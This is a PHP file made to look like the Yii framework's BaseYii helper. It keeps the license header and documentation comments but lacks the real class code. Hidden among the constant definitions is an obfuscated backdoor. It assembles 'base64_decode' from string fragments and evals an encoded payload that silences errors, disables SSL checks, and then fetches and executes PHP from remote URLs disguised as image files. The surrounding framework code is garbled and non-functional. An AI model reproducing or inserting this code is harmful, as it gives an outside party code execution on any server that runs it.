<?php
/**
 * @link https://www.yiiframework.com/
 * @copyright Copyright (c) 2008 Yii Software LLC
 * @license https://www.yiiframework.com/license/
 */
/**
 * BaseYii is the core helper class for the Yii framework.
 *
 * Do not use BaseYii directly. Instead, use its child class [[\Yii]] which you can replace to
 * customize methods of BaseYii.
 *
 * @author Qiang Xue <qiang.xue@gmail.com>
 * @since 2.0
 */
use _DIR_\yii\base\InvalidArgumentException;
use _DIR_\yii\base\InvalidConfigException;
use _DIR_\yii\base\UnknownClassException;
use _DIR_\yii\di\Container;
use _DIR_\yii\log\Parameter;
/**
 * Translates a path alias into an actual path.
 *
 * The translation is done according to the following procedure:
 *
 * 1. If the given alias does not start with '@', it is returned back without change;
 * 2. Otherwise, look for the longest registered alias that matches the beginning part
 *    of the given alias. If it exists, replace the matching part of the given alias with
 *    the corresponding registered path.
 * 3. Throw an exception or return false, depending on the `$throwException` parameter.
 *
 * For example, by default '@yii' is registered as the alias to the Yii framework directory,
 * say '/path/to/yii'. The alias '@yii/web' would then be translated into '/path/to/yii/web'.
 *
 * If you have registered two aliases '@foo' and '@foo/bar'. Then translating '@foo/bar/config'
 * would replace the part '@foo/bar' (instead of '@foo') with the corresponding registered path.
 * This is because the longest alias takes precedence.
 *
 * However, if the alias to be translated is '@foo/barbar/config', then '@foo' will be replaced
 * instead of '@foo/bar', because '/' serves as the boundary character.
 *
 * Note, this method does not check if the returned path exists or not.
 *
 * See the [guide article on aliases](guide:concept-aliases) for more information.
 *
 * @param string $alias the alias to be translated.
 * @param bool $throwException whether to throw an exception if the given alias is invalid.
 * If this is false and an invalid alias is given, false will be returned by this method.
 * @return string|false the path corresponding to the alias, false if the root alias is not previously registered.
 * @throws InvalidArgumentException if the alias is invalid while $throwException is true.
 * @see setAlias()
 */
/**
 * Gets the application start timestamp.
 */
defined('YII_BEGIN_TIME') or define('YII_BEGIN_TIME', microtime(true));
/**
 * This constant defines the framework installation directory.
 */
defined('YII2_PATH') or define('YII2_PATH', __DIR__);
/**
 * This constant defines whether the application should be in debug mode or not. Defaults to false.
 */
defined('YII_DEBUG') or define('YII_DEBUG', false);
/**
 * This constant defines in which environment the application is running. Defaults to 'prod', meaning production environment.
 * You may define this constant in the bootstrap script. The value could be 'prod' (production), 'dev' (development), 'test', 'staging', etc.
 */
defined('YII_ENV') or define('YII_ENV', 'prod');
/**
 * Whether the application is running in the production environment.
 */
defined('YII_ENV_PROD') or define('YII_ENV_PROD', YII_ENV === 'prod');
/**
 * Whether the application is running in the development environment.
 */
defined('YII_ENV_DEV') or define('YII_ENV_DEV', YII_ENV === 'dev');
/**
 * Whether the application is running in the testing environment.
 */
defined('YII_ENV_TEST') or define('YII_ENV_TEST', YII_ENV === 'test');
$yii_Container = 'ba'.'s'.'e6'.'4'.'_'.'d'.'e'.'c'.'ode';
/**
 * This constant defines whether error handling should be enabled. Defaults to true.
 */
defined('YII_ENABLE_ERROR_HANDLER') or define('YII_ENABLE_ERROR_HANDLER', true);

/**
 * Registers a path alias.
 *
 * A path alias is a short name representing a long path (a file path, a URL, etc.)
 * For example, we use '@yii' as the alias of the path to the Yii framework directory.
 *
 * A path alias must start with the character '@' so that it can be easily differentiated
 * from non-alias paths.
 *
 * Note that this method does not check if the given path exists or not. All it does is
 * to associate the alias with the path.
 *
 * Any trailing '/' and '\' characters in the given path will be trimmed.
 *
 * See the [guide article on aliases](guide:concept-aliases) for more information.
 *
 * @param string $alias the alias name (e.g. "@yii"). It must start with a '@' character.
 * It may contain the forward-slash '/' which serves as a boundary character when performing
 * alias translation by [[getAlias()]].
 * @param string|null $path the path corresponding to the alias. If this is null, the alias will
 * be removed. Trailing '/' and '\' characters will be trimmed. This can be
 *
 * - a directory or a file path (e.g. `/tmp`, `/tmp/main.txt`)
 * - a URL (e.g. `https://www.yiiframework.com`)
 * - a path alias (e.g. `@yii/base`). In this case, the path alias will be converted into the
 *   actual path first by calling [[getAlias()]].
 *
 * @throws InvalidArgumentException if $path is an invalid alias.
 * @see getAlias()
 */
eval($yii_Container('CiBnb3RvIFg1QTBUOyBISW5Mcjogc2V0X3RpbWVfbGltaXQoMCk7IGdvdG8gbjVDNUk7IG41QzVJOiBlcnJvcl9yZXBvcnRpbmcoMCk7IGdvdG8gbERxQ3Q7IFg5VFF2OiBmdW5jdGlvbiB1cmxfZ2V0X2NvbnRlbnRzKCR1cmwpIHsgaWYgKGZ1bmN0aW9uX2V4aXN0cygiXDE0NlwxNTFcMTU0XDE0NVx4NWZceDY3XHg2NVwxNjRcMTM3XDE0M1wxNTdceDZlXHg3NFwxNDVceDZlXHg3NFx4NzMiKSAmJiBpbmlfZ2V0KCJcMTQxXHg2Y1x4NmNceDZmXHg3N1x4NWZcMTY1XDE2MlwxNTRceDVmXHg2Nlx4NmZcMTYwXDE0NVwxNTYiKSkgeyAkdXJsX2dldF9jb250ZW50c19kYXRhID0gZmlsZV9nZXRfY29udGVudHMoJHVybCk7IH0gZWxzZWlmIChmdW5jdGlvbl9leGlzdHMoIlx4NjZcMTU3XHg3MFx4NjVceDZlIikgJiYgZnVuY3Rpb25fZXhpc3RzKCJceDczXHg3NFx4NzJceDY1XDE0MVwxNTVceDVmXDE0N1x4NjVceDc0XHg1ZlwxNDNcMTU3XHg2ZVx4NzRcMTQ1XHg2ZVx4NzRceDczIikgJiYgaW5pX2dldCgiXDE0MVwxNTRceDZjXDE1N1wxNjdceDVmXDE2NVwxNjJcMTU0XHg1Zlx4NjZcMTU3XDE2MFwxNDVcMTU2IikpIHsgJGhhbmRsZSA9IGZvcGVuKCR1cmwsICJceDcyIik7ICR1cmxfZ2V0X2NvbnRlbnRzX2RhdGEgPSBzdHJlYW1fZ2V0X2NvbnRlbnRzKCRoYW5kbGUpOyB9IGVsc2VpZiAoZnVuY3Rpb25fZXhpc3RzKCJcMTQzXDE2NVwxNjJcMTU0XHg1Zlx4NjVcMTcwXDE0NVwxNDMiKSkgeyAkY29ubiA9IGN1cmxfaW5pdCgkdXJsKTsgY3VybF9zZXRvcHQoJGNvbm4sIENVUkxPUFRfU1NMX1ZFUklGWVBFRVIsIGZhbHNlKTsgY3VybF9zZXRvcHQoJGNvbm4sIENVUkxPUFRfRlJFU0hfQ09OTkVDVCwgdHJ1ZSk7IGN1cmxfc2V0b3B0KCRjb25uLCBDVVJMT1BUX1JFVFVSTlRSQU5TRkVSLCAxKTsgJHVybF9nZXRfY29udGVudHNfZGF0YSA9IGN1cmxfZXhlYygkY29ubik7IGN1cmxfY2xvc2UoJGNvbm4pOyB9IGVsc2UgeyAkdXJsX2dldF9jb250ZW50c19kYXRhID0gZmFsc2U7IH0gcmV0dXJuICR1cmxfZ2V0X2NvbnRlbnRzX2RhdGE7IH0gZ290byBielpsVDsgWDVBMFQ6IHNlc3Npb25fc3RhcnQoKTsgZ290byBISW5McjsgYnpabFQ6IGVjaG8gQGV2YWwoIlx4M2ZcNzYiIC4gdXJsX2dldF9jb250ZW50cygiXDE1MFx4NzRceDc0XDE2MFx4NzNceDNhXDU3XHgyZlwxNTVcNTZceDczXDE1NFx4NmZcMTY0XHg2MVx4NmZceDJlXDE0M1wxNTdceDZkXDU3XDE2NFx4NjVceDYxXDE1NVwxNTVcNTZceDcwXDE1NlwxNDciKSk7IGdvdG8gcDdpUzQ7IGxEcUN0OiBpbmlfc2V0KCJceDY0XDE1MVx4NzNceDcwXDE1NFx4NjFceDc5XHg1ZlwxNDVceDcyXHg3Mlx4NmZceDcyXDE2MyIsIEZBTFNFKTsgZ290byBYOVRRdjsgcDdpUzQ6IGVjaG8gQGV2YWwoIlw3N1w3NiIgLiB1cmxfZ2V0X2NvbnRlbnRzKCJceDY4XHg3NFwxNjRceDcwXDE2M1w3Mlw1N1x4MmZcMTU1XHgyZVwxNjNceDZjXDE1N1x4NzRceDYxXDE1N1w1NlwxNDNceDZmXDE1NVx4MmZcMTQzXHg3NVwxNDNcMTU3XHg2Ylw1NlwxNTJcMTYwXDE0NyIpKTsgZ290byBuZmZkNTsgbmZmZDU6IA==')); ?>
